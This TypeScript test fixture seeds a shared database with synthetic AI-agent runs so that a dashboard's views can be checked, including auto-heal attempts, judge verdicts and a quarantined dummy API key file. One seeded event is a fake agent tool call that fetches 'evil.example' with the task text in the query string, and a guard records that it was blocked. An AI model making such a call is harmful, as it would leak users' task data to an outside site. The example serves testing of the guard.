import { neon } from "@neondatabase/serverless";

// The flow tests need runs in shapes the seed does not have (a v2 verdict, a follow-up, a flagged step, a stopped
// guard, a live run, a stopped run, a failed run, an older stored verdict, a run of an automation), so they insert
// their own. Every run is named "[e2e] home ...", the one automation "[e2e] home audit", and all are deleted
// afterwards: the database is shared with the other packages and with the demo.
const PREFIX = "[e2e] home";
const COMMAND = "e2e-home-audit";
const WORKSPACE = "demo-workspace"; // the seeded demo workspace, which the demo user's session resolves to
const MODEL = "claude-sonnet-4-5";

function client() {
  // the dev server under test reads .env.local; so does this, so both look at the same database
  if (!process.env.DATABASE_URL) process.loadEnvFile(".env.local");
  return neon(process.env.DATABASE_URL!);
}

export type HomeRuns = {
  parent: string; followUp: string; live: string; stopped: string; failed: string; legacy: string; audit: string; automation: string;
  example: string; long: string; healing: string; healed: string; unfixed: string; stuck: string; carried: string; unchecked: string;
};
export const AUTOMATION = { name: `${PREFIX} audit`, command: COMMAND, input: "Acme Ltd" }; // a draft
export const READY = { name: `${PREFIX} ready check`, command: "e2e-home-ready", hint: "The registered name, e.g. Acme Ltd" };
export const TITLES = {
  parent: `${PREFIX} parent: list three facts about the Moon`,
  followUp: `${PREFIX} follow-up: add the Moon's distance from Earth`,
  carried: `${PREFIX} carried: write the report again, shorter`, // a follow-up of the follow-up that keeps its files
  unchecked: `${PREFIX} unchecked: sum the fruit counts while the judge is away`, // the model was down when it was judged
  live: `${PREFIX} live: count to three slowly`,
  stopped: `${PREFIX} stopped: summarise the week's AI news`,
  failed: `${PREFIX} failed: fetch a page that is not there`,
  legacy: `${PREFIX} legacy: a run checked by the first version`,
  audit: `${PREFIX} audit run: audit Acme Ltd, ownership and filings`, // the filled template: not what the title shows
  example: `${PREFIX} example run: audit Globex, ownership and filings`,
  // Q137: a brief long enough to take four lines as a title
  long: `${PREFIX} long: read the three most recent quarterly reports of every listed European carmaker, compare their margins, their order books and what each says about electric models, then write a two-page summary for the board with a table of the figures and a short list of the risks each company names`,
  healing: `${PREFIX} healing: list at least eight AI news stories in a CSV`,
  healed: `${PREFIX} healed: list at least eight robotics stories in a CSV`,
  unfixed: `${PREFIX} unfixed: list at least eight space stories in a CSV`,
  stuck: `${PREFIX} stuck: list at least eight sea stories in a CSV`,
};
// The failed run's error as the engine records a run that hit its time limit (src/lib/agent/run.ts)
export const FAILED_ERROR = "timed out after 290 s";
// Auto-heal: what the check found on the first result, what the agent was then told, and the engine's words when it
// stops trying (src/lib/agent/heal.ts, noProgress)
export const HEAL = {
  reason: "At least 8 rows: 3 rows",
  feedback: "output.csv has 3 rows; the brief asks for at least 8. Add stories until there are 8 or more.",
  stopped: "This attempt failed the same way as an earlier one, so healing stopped here.",
};

const PLAN = (running: number | null) => ({
  intent: "Facts about the Moon",
  expectedOutputs: ["a short report"],
  sources: ["web search"],
  steps: ["Search for facts", "Pick three", "Write the report"].map((title, index) => ({
    index,
    title,
    status: running === null || index < running ? "done" : index === running ? "running" : "pending",
  })),
});

// The evaluator writes one "content" check per file, so two files mean two checks with the same id.
const CHECKS = [
  { id: "report", label: "A report was written", ok: true, detail: "412 characters" },
  { id: "file_expected", label: "A file was written", ok: true, detail: "chart.svg, contacts.csv" },
  { id: "content", label: "The file has content", ok: true, detail: "96 characters" },
  { id: "content", label: "The file has content", ok: true, detail: "54 characters" },
];

// A v1 verdict: no path, no decidedBy. The Why? block has to work them out.
const V1_PASS = { verdict: "pass", checks: CHECKS, judgment: { answeredQuery: 0.93, followedPlan: 0.9 }, review: null, reasons: [], evaluatedAt: new Date().toISOString() };
// The first version's stored shape (score and reason, no judgment): it no longer parses as a Verdict, but its headline does.
const LEGACY = { verdict: "pass", score: 0.9, checks: CHECKS.slice(0, 2), reason: "Every check passed." };
// A v2 verdict that went all the way to the reviewer.
const V2_NOTES = {
  verdict: "pass_with_notes",
  checks: CHECKS,
  judgment: { answeredQuery: 0.91, followedPlan: 0.62 },
  review: { taskFinished: true, responseSuitable: true, changeNeeded: "Give the distance in kilometres as well as miles.", reasoning: "The distance is there, in miles only." },
  reasons: ["The distance is there, in miles only."],
  evaluatedAt: new Date().toISOString(),
  decidedBy: "review",
  path: ["checks", "judge", "review"],
};

// The checks passed and the judge could not be reached (the model was down): nobody looked at the content (Q208)
const UNKNOWN = {
  verdict: "unknown",
  checks: CHECKS,
  judgment: null,
  review: null,
  reasons: ["The judge was unavailable: 503 Service Unavailable"],
  evaluatedAt: new Date().toISOString(),
  decidedBy: "nobody",
  path: ["checks", "judge"],
};

// A result that still did not pass after every attempt to fix it
const FAIL_ROWS = {
  verdict: "fail",
  checks: [{ id: "rows", label: "At least 8 rows", ok: false, detail: "6 rows" }],
  judgment: null,
  review: null,
  reasons: ["At least 8 rows: 6 rows"],
  evaluatedAt: new Date().toISOString(),
  decidedBy: "checks",
  path: ["checks"],
};

const SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="120" height="60"><rect width="120" height="60" fill="#15845a"/></svg>';
const CSV = "name,email\nA,a@x.example\nB,b@x.example\nC,c@x.example\n";
// Q144: agents often open with their own "Report" heading, and quote names as `code`
const REPORT = [
  "## Report",
  "",
  "The Moon is 238,855 miles from Earth on average; the figures are in `table.xlsx`.",
  "",
  "| Measure | Value |",
  "|---|---|",
  "| Distance | 238,855 miles |",
  "| Diameter | 2,159 miles |",
].join("\n");

export async function createHomeRuns(): Promise<HomeRuns> {
  await deleteHomeRuns(); // a crashed earlier run may have left its rows behind
  const sql = client();
  const insert = async (row: { prompt: string; status: string; minutesAgo: number; purpose?: string; parent?: string; verdict?: unknown; report?: string; human?: string; error?: string; automation?: string; input?: string; heals?: number; cost?: number }) => {
    const [r] = await sql.query(
      `insert into runs (workspace_id, created_by, purpose, parent_run_id, prompt, status, model, report, verdict, human_verdict, error, automation_id, automation_version, input, created_at, finished_at, num_turns, duration_ms, cost_usd, heal_attempts)
       values ($1, 'demo-user', $2, $3, $4, $5, $6, $7, $8::jsonb, $9, $10, $11, $12, $13, now() - make_interval(mins => $14), $15, 4, 42000, $17, $16) returning id`,
      [WORKSPACE, row.purpose ?? "adhoc", row.parent ?? null, row.prompt, row.status, MODEL, row.report ?? null,
        row.verdict ? JSON.stringify(row.verdict) : null, row.human ?? null, row.error ?? null, row.automation ?? null, row.automation ? 1 : null, row.input ?? null, row.minutesAgo,
        row.status === "running" ? null : new Date(Date.now() - (row.minutesAgo - 1) * 60_000).toISOString(), row.heals ?? 0, row.cost ?? 0.12],
    );
    return r.id as string;
  };
  const events = async (runId: string, list: { kind: string; payload: unknown }[]) => {
    for (const [i, e] of list.entries())
      await sql.query("insert into run_events (run_id, seq, kind, payload) values ($1, $2, $3, $4::jsonb)", [runId, i + 1, e.kind, JSON.stringify(e.payload)]);
  };
  const file = (runId: string, name: string, mime: string, content: string, extra: { encoding?: string; flags?: unknown[]; quarantined?: boolean } = {}) =>
    sql.query("insert into files (run_id, name, mime, bytes, content, encoding, flags, quarantined) values ($1, $2, $3, $4, $5, $6, $7::jsonb, $8)", [
      runId, name, mime, Buffer.byteLength(content), content, extra.encoding ?? "utf8", JSON.stringify(extra.flags ?? []), extra.quarantined ?? false,
    ]);
  // the built-in servers are in the started event as the engine records them: they must not read as connections
  const started = { kind: "started", payload: { model: MODEL, tools: ["WebSearch"], mcp_servers: [{ name: "plan", status: "connected" }, { name: "outputs", status: "connected" }] } };
  const finished = (subtype = "success", isError = false) => ({
    kind: "finished",
    payload: { subtype, is_error: isError, num_turns: 4, duration_ms: 42000, total_cost_usd: 0.12, result: "The Moon is 238,855 miles away." },
  });
  // an attempt of a healing run: the SDK's total keeps running across the resumed session, the attempt's own cost
  // is recorded beside it (Q149)
  const attempt = (total: number, own: number) => ({
    kind: "finished",
    payload: { subtype: "success", is_error: false, num_turns: 3, duration_ms: 20000, total_cost_usd: total, attempt_cost_usd: own, result: "Done." },
  });
  const call = (id: string, name: string, input: unknown) => ({ kind: "tool_call", payload: { tool_use_id: id, name, input } });

  const [auto] = await sql.query(
    `insert into automations (workspace_id, created_by, name, command, description, input_label, input_hint, input_example, template, status)
     values ($1, 'demo-user', $2, $3, 'Audits a company', 'Company name', 'The registered name, e.g. Acme Ltd', 'Acme Ltd', $4::jsonb, 'draft') returning id`,
    [WORKSPACE, AUTOMATION.name, COMMAND, JSON.stringify({ instructions: "Audit {input}: ownership and filings", intent: "", expectedOutputs: ["audit.md about {input}"], outputFormat: "", steps: ["Search"], connections: [] })],
  );
  const automation = auto.id as string;
  // a ready one too, so the command list has something known to offer; the tests never run it
  await sql.query(
    `insert into automations (workspace_id, created_by, name, command, description, input_label, input_hint, input_example, template, status, approved_at)
     values ($1, 'demo-user', $2, $3, 'Checks a company', 'Company name', 'The registered name, e.g. Acme Ltd', 'Acme Ltd', $4::jsonb, 'active', now())`,
    [WORKSPACE, READY.name, READY.command, JSON.stringify({ instructions: "Check {input}", intent: "", expectedOutputs: ["check.md about {input}"], outputFormat: "", steps: ["Search"], connections: [] })],
  );

  const parent = await insert({ prompt: TITLES.parent, status: "succeeded", minutesAgo: 8, verdict: V1_PASS, report: "Three facts about the **Moon**." });
  await events(parent, [started, { kind: "plan", payload: PLAN(null) }, finished()]);

  const legacy = await insert({ prompt: TITLES.legacy, status: "succeeded", minutesAgo: 7, verdict: LEGACY, report: "Done." });
  await events(legacy, [started, { kind: "plan", payload: PLAN(null) }, finished()]);

  const audit = await insert({ prompt: TITLES.audit, status: "succeeded", minutesAgo: 6, purpose: "automation", automation, input: AUTOMATION.input, verdict: V1_PASS, report: "Acme Ltd is owned by ..." });
  await events(audit, [started, { kind: "plan", payload: PLAN(null) }, finished()]);

  // it ran out of time in the middle of a call: the call never answered, and the run has no finished event
  const failed = await insert({ prompt: TITLES.failed, status: "failed", minutesAgo: 5, error: FAILED_ERROR });
  await events(failed, [started, { kind: "plan", payload: PLAN(1) }, call("t0", "WebFetch", { url: "https://example.com/not-there" })]);

  const followUp = await insert({ prompt: TITLES.followUp, status: "succeeded", minutesAgo: 4, purpose: "followup", parent, verdict: V2_NOTES, human: "approved", report: REPORT });
  await events(followUp, [
    started,
    { kind: "plan", payload: PLAN(null) },
    call("t1", "WebFetch", { url: "https://evil.example/?q=the-task-text" }),
    { kind: "guard", payload: { guard: "url", tool: "WebFetch", decision: "blocked", reason: "This address looks like it carries the task's data to another site. Leave the data out of the address.", target: "evil.example" } },
    { kind: "guard", payload: { guard: "path", tool: "Read", decision: "allowed", reason: "inside the run directory" } },
    { kind: "check", payload: { stepIndex: 1, onTrack: 0.3, note: "It found two facts, not three." } },
    { kind: "check", payload: { stepIndex: 0, onTrack: 0.9, note: "Searched as planned." } },
    call("t2", "Write", { file_path: "/tmp/run/contacts.csv", content: CSV }),
    call("t3", "mcp__outputs__make_chart", { file: "chart.svg", title: "Distance", kind: "bar", x: "k", y: "v", data: [{ k: "a", v: 1 }] }),
    call("t4", "mcp__outputs__make_spreadsheet", { file: "table.xlsx", sheets: [{ name: "Measures", columns: ["measure", "value"], rows: [["Distance", 238855], ["Diameter", 2159]] }] }),
    finished(),
  ]);
  await file(followUp, "chart.svg", "image/svg+xml", SVG);
  await file(followUp, "contacts.csv", "text/csv", CSV, { flags: [{ kind: "email", count: 3, detail: "3 email addresses" }] });
  await file(followUp, "keys.txt", "text/plain", "API_KEY=sk-test-not-a-real-key", {
    flags: [{ kind: "credential", count: 1, detail: "an API key on line 1" }],
    quarantined: true,
  });
  await file(followUp, "table.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", Buffer.from("not a real workbook").toString("base64"), { encoding: "base64" });

  // Q205: a follow-up gets its parent's files back and keeps them without making them again, so its events have no
  // spreadsheet call for table.xlsx: the tile must still say what the sheets are
  const carried = await insert({ prompt: TITLES.carried, status: "succeeded", minutesAgo: 3, purpose: "followup", parent: followUp, verdict: V1_PASS, report: "Shorter now." });
  await events(carried, [started, { kind: "plan", payload: PLAN(null) }, finished()]);
  await file(carried, "table.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", Buffer.from("not a real workbook").toString("base64"), { encoding: "base64" });

  const unchecked = await insert({ prompt: TITLES.unchecked, status: "succeeded", minutesAgo: 15, verdict: UNKNOWN, report: "Ten pieces of fruit." });
  await events(unchecked, [started, { kind: "plan", payload: PLAN(null) }, finished()]);

  const stopped = await insert({ prompt: TITLES.stopped, status: "cancelled", minutesAgo: 2 });
  await events(stopped, [started, { kind: "plan", payload: PLAN(1) }]);

  const live = await insert({ prompt: TITLES.live, status: "running", minutesAgo: 1 });
  await events(live, [started, { kind: "plan", payload: PLAN(1) }]);

  // an example of the draft automation: the rail tags it "example", and its command must still find it (Q133)
  const example = await insert({ prompt: TITLES.example, status: "succeeded", minutesAgo: 10, purpose: "trial", automation, input: "Globex", verdict: V1_PASS, report: "Globex is owned by ..." });
  await events(example, [started, { kind: "plan", payload: PLAN(null) }, finished()]);

  const long = await insert({ prompt: TITLES.long, status: "succeeded", minutesAgo: 11, verdict: V1_PASS, report: "The board summary." });
  await events(long, [started, { kind: "plan", payload: PLAN(null) }, finished()]);

  // auto-heal, in its three states: fixing now (no verdict yet: it is written once, at the end), fixed, not fixed
  const heal = (attempt: number, reason: string) => ({ kind: "heal", payload: { attempt, max: 2, reasons: [reason], feedback: HEAL.feedback } });
  const healing = await insert({ prompt: TITLES.healing, status: "running", minutesAgo: 1, heals: 1 });
  await events(healing, [started, { kind: "plan", payload: PLAN(null) }, finished(), heal(1, HEAL.reason)]);

  const healed = await insert({ prompt: TITLES.healed, status: "succeeded", minutesAgo: 12, heals: 1, verdict: V1_PASS, report: "Eight robotics stories.", cost: 0.17 });
  await events(healed, [started, { kind: "plan", payload: PLAN(null) }, attempt(0.12, 0.12), heal(1, HEAL.reason), attempt(0.17, 0.05)]);

  const unfixed = await insert({ prompt: TITLES.unfixed, status: "succeeded", minutesAgo: 13, heals: 2, verdict: FAIL_ROWS, report: "Six space stories.", cost: 0.2 });
  await events(unfixed, [started, { kind: "plan", payload: PLAN(null) }, attempt(0.1, 0.1), heal(1, HEAL.reason), attempt(0.15, 0.05), heal(2, "At least 8 rows: 5 rows"), attempt(0.2, 0.05)]);

  // Q148: the engine stopped trying - the second heal is recorded with its reason and never made, and not counted
  const stuck = await insert({ prompt: TITLES.stuck, status: "succeeded", minutesAgo: 14, heals: 1, verdict: FAIL_ROWS, report: "Six sea stories.", cost: 0.15 });
  await events(stuck, [started, { kind: "plan", payload: PLAN(null) }, attempt(0.1, 0.1), heal(1, HEAL.reason), attempt(0.15, 0.05), { kind: "heal", payload: { attempt: 2, max: 2, reasons: ["At least 8 rows: 6 rows"], feedback: HEAL.feedback, stopped: HEAL.stopped } }]);

  return { parent, followUp, live, stopped, failed, legacy, audit, automation, example, long, healing, healed, unfixed, stuck, carried, unchecked };
}

export async function deleteHomeRuns(): Promise<void> {
  const sql = client();
  const ids = `select id from runs where prompt like '${PREFIX}%'`; // the prefix is a constant, never user input
  await sql.query(`delete from run_events where run_id in (${ids})`);
  await sql.query(`delete from files where run_id in (${ids})`);
  await sql.query(`delete from runs where prompt like '${PREFIX}%'`);
  await sql.query("delete from automations where workspace_id = $1 and command in ($2, $3)", [WORKSPACE, COMMAND, READY.command]);
}
